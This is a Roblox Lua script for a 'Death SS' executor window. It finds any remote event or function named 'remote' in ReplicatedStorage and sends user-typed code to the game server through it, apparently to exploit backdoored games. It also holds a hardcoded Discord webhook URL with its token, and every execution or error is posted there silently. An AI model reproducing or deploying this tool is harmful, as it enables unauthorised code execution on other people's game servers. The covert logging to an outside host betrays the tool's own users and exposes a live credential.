local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local WEBHOOK = "https://discord.com/api/webhooks/1393626932444135556/6CCtBAxFJ0NabJgxOJ8jsvCsbdMxdjmCYqU7UK3vzhcH-YgcwxDrKTsNZoEgsALcOypX"

local function sendWebhook(data)
    spawn(function()
        local payload = HttpService:JSONEncode({username = "Death SS", content = data})
        pcall(function()
            HttpService:PostAsync(WEBHOOK, payload, Enum.HttpContentType.ApplicationJson)
        end)
    end)
end

local UI = Instance.new("ScreenGui", PlayerGui)
UI.Name = "DeathSS"
UI.ResetOnSpawn = false

local Main = Instance.new("Frame", UI)
Main.Size = UDim2.new(0, 600, 0, 380)
Main.Position = UDim2.new(0.5, 0, 0.5, 0)
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)

local TopBar = Instance.new("Frame", Main)
TopBar.Size = UDim2.new(1, 0, 0, 40)
TopBar.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
TopBar.BorderSizePixel = 0
TopBar.Active = true
TopBar.Draggable = true
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)

local Title = Instance.new("TextLabel", TopBar)
Title.Size = UDim2.new(1, -50, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Death SS"
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(235, 235, 235)
Title.TextSize = 20
Title.TextXAlignment = Enum.TextXAlignment.Left

local CloseBtn = Instance.new("TextButton", TopBar)
CloseBtn.Size = UDim2.new(0, 40, 1, 0)
CloseBtn.Position = UDim2.new(1, -50, 0, 0)
CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 20
CloseBtn.BorderSizePixel = 0
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)
CloseBtn.MouseEnter:Connect(function()
    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(70, 20, 20)}):Play()
end)
CloseBtn.MouseLeave:Connect(function()
    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 10, 10)}):Play()
end)
CloseBtn.MouseButton1Click:Connect(function() UI:Destroy() end)

local TabPanel = Instance.new("Frame", Main)
TabPanel.Size = UDim2.new(0, 120, 1, -40)
TabPanel.Position = UDim2.new(0, 0, 0, 40)
TabPanel.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
TabPanel.BorderSizePixel = 0
Instance.new("UICorner", TabPanel).CornerRadius = UDim.new(0, 12)

local EditorFrame = Instance.new("Frame", Main)
EditorFrame.Size = UDim2.new(1, -120, 1, -65)
EditorFrame.Position = UDim2.new(0, 120, 0, 40)
EditorFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
EditorFrame.BorderSizePixel = 0
Instance.new("UICorner", EditorFrame).CornerRadius = UDim.new(0, 12)

local Editor = Instance.new("TextBox", EditorFrame)
Editor.Size = UDim2.new(1, -40, 1, -90)
Editor.Position = UDim2.new(0, 20, 0, 20)
Editor.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
Editor.TextColor3 = Color3.fromRGB(235, 235, 235)
Editor.Font = Enum.Font.Code
Editor.TextSize = 16
Editor.ClearTextOnFocus = false
Editor.MultiLine = true
Editor.TextXAlignment = Enum.TextXAlignment.Left
Editor.TextYAlignment = Enum.TextYAlignment.Top
Editor.PlaceholderText = "Enter your payload here..."
Editor.BorderSizePixel = 0
Instance.new("UICorner", Editor).CornerRadius = UDim.new(0, 8)

local ButtonFrame = Instance.new("Frame", EditorFrame)
ButtonFrame.Size = UDim2.new(1, -40, 0, 50)
ButtonFrame.Position = UDim2.new(0, 20, 1, -60)
ButtonFrame.BackgroundTransparency = 1

local function createButton(text, pos)
    local btn = Instance.new("TextButton", ButtonFrame)
    btn.Size = UDim2.new(0, 100, 1, 0)
    btn.Position = UDim2.new(0, pos, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(60, 130, 230)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.Text = text
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    btn.AutoButtonColor = false
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(90, 160, 255)}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 130, 230)}):Play()
    end)
    return btn
end

local ExecuteBtn = createButton("EXECUTE", 0)
local ClearBtn = createButton("CLEAR", 120)

local currentRemoteEvent
local currentRemoteFunction

local function updateRemotes()
    currentRemoteEvent = nil
    currentRemoteFunction = nil
    for _,v in pairs(ReplicatedStorage:GetChildren()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("remote") then
            currentRemoteEvent = v
        elseif v:IsA("RemoteFunction") and v.Name:lower():find("remote") then
            currentRemoteFunction = v
        end
    end
end
updateRemotes()
ReplicatedStorage.ChildAdded:Connect(updateRemotes)
ReplicatedStorage.ChildRemoved:Connect(updateRemotes)

ExecuteBtn.MouseButton1Click:Connect(function()
    local code = Editor.Text
    local success, response
    if currentRemoteEvent then
        success, response = pcall(function()
            currentRemoteEvent:FireServer(code)
        end)
    elseif currentRemoteFunction then
        success, response = pcall(function()
            return currentRemoteFunction:InvokeServer(code)
        end)
    end
    if success then
        sendWebhook("Executed code:\n```lua\n" .. tostring(code) .. "\n```")
    else
        sendWebhook("Failed execution:\n```" .. tostring(response) .. "```")
    end
end)

ClearBtn.MouseButton1Click:Connect(function()
    Editor.Text = ""
end)
